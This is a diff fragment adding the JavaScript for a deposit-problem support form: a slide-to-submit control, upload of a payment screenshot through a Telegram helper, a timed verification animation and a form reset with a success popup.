+    function resetSlider() {
+      var thumb = $('slideThumb');
+      var fill = $('slideFill');
+      if (thumb) { thumb.style.transition = 'left 0.35s cubic-bezier(0.25, 0.8, 0.25, 1)'; thumb.style.left = '4px'; thumb.classList.remove('done'); }
+      if (fill) { fill.style.transition = 'width 0.35s cubic-bezier(0.25, 0.8, 0.25, 1)'; fill.style.width = '0%'; }
+    }
+
+    function doSubmit() {
+      if (_submitted || _submitting) return;
+
+      var paymentFile = document.querySelector('[name="payment_screenshot"]');
+      if (!paymentFile || !paymentFile.files || !paymentFile.files[0]) { showToast('Upload payment screenshot'); resetSlider(); return; }
+
+      _submitting = true;
+      _submitted = true;
+      _formData.type = 'Deposit Problem';
+      _formData.time = new Date().toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' });
+
+      var verifyOverlay = $('verifyOverlay');
+      var ringWrap = $('verifyRingWrap');
+      var verifyTitle = $('verifyTitle');
+      var verifySub = $('verifySub');
+
+      verifyOverlay.classList.add('active');
+      setTimeout(function() { ringWrap.classList.add('animating'); }, 400);
+
+      var rid = "DP" + Math.floor(100000 + Math.random() * 900000);
+      var uploads = [];
+
+      if (paymentFile.files[0]) {
+        uploads.push(sendImageToTelegram(paymentFile.files[0], '🆔 ' + rid + ' | Payment Screenshot').then(function(url) { _formData.payment_screenshot_url = url; }));
+      }
+
+      Promise.all(uploads).then(function() {
+        setTimeout(function() {
+          ringWrap.classList.remove('animating');
+          ringWrap.classList.add('done');
+          verifyTitle.classList.add('done');
+          verifyTitle.textContent = 'Request Submitted!';
+          verifySub.classList.add('done');
+          verifySub.textContent = 'Your deposit request has been submitted successfully';
+        }, 5400);
+
+        return saveSubmission(_formData);
+      }).then(function() {
+        setTimeout(function() {
+          verifyOverlay.classList.remove('active');
+          _submitting = false;
+          resetSlider();
+          _submitted = false;
+          goToStep(1);
+          document.querySelectorAll('.problem-option').forEach(function(o) { o.classList.remove('selected'); });
+          document.querySelectorAll('input[type="radio"]').forEach(function(r) { r.checked = false; });
+          document.querySelectorAll('.file-label').forEach(function(l) { l.classList.remove('has-file'); l.querySelector('span').textContent = l.id.replace('Label', '').replace(/^[a-z]/, function(m) { return m.toUpperCase(); }) || 'Choose file'; });
+          document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
+          $('fAmount').value = '';
+          $('fUtr').value = '';
+          var sp = $('successPopup');
+          sp.classList.add('active');
+          setTimeout(function() { $('successBar').classList.add('animating'); }, 100);
+          setTimeout(function() { sp.classList.add('closing'); }, 5100);
+          setTimeout(function() { sp.classList.remove('active', 'closing'); $('successBar').classList.remove('animating'); }, 5500);
+        }, 6200);
+      }).catch(function(err) {
+        console.warn('Submit failed:', err);
+        verifyOverlay.classList.remove('active');
+        ringWrap.classList.remove('animating', 'done');
+        showToast('Submission failed - try again');
+        _submitting = false;
+        _submitted = false;
+        resetSlider();
+      });
+    }
+
+    function initSlider() {
+      var track = document.querySelector('.slide-track');
+      var thumb = $('slideThumb');
+      var fill = $('slideFill');
+      if (!track || !thumb) return;
+      var startX = 0, currentX = 0, isDragging = false;
+      var maxTravel = 0, thumbStartLeft = 0;
+      function getMaxTravel() { return Math.max(track.offsetWidth - 56, 100); }
+      function onStart(e) {
+        if (_submitting) return;
+        isDragging = true; maxTravel = getMaxTravel();
+        var pos = e.type.indexOf('touch') === 0 ? e.touches[0] : e;
+        startX = pos.clientX;
+        thumbStartLeft = parseFloat(thumb.style.left) || 4;
+        thumb.style.transition = 'none'; fill.style.transition = 'none';
+      }
+      function onMove(e) {
+        if (!isDragging) return; e.preventDefault();
+        var pos = e.type.indexOf('touch') === 0 ? e.touches[0] : e;
+        var delta = pos.clientX - startX;
+        currentX = thumbStartLeft - 4 + delta;
+        if (currentX < 0) currentX = 0;
+        if (currentX > maxTravel) currentX = maxTravel;
+        thumb.style.left = (4 + currentX) + 'px';
+        fill.style.width = (currentX / maxTravel * 100) + '%';
+      }
+      function onEnd() {
+        if (!isDragging) return; isDragging = false;
+        thumb.style.transition = 'left 0.4s cubic-bezier(0.25, 0.8, 0.25, 1)';
+        fill.style.transition = 'width 0.4s cubic-bezier(0.25, 0.8, 0.25, 1)';
+        if (currentX >= maxTravel - 2) { thumb.classList.add('done'); setTimeout(function() { doSubmit(); }, 300); }
+        else { resetSlider(); }
+      }
+      thumb.addEventListener('mousedown', onStart);
+      document.addEventListener('mousemove', onMove);
+      document.addEventListener('mouseup', onEnd);
+      thumb.addEventListener('touchstart', onStart, { passive: true });
+      document.addEventListener('touchmove', onMove, { passive: false });
+      document.addEventListener('touchend', onEnd);
+    }
+    setTimeout(function() { initSlider(); }, 200);
+  </script>
+</body>
+</html>
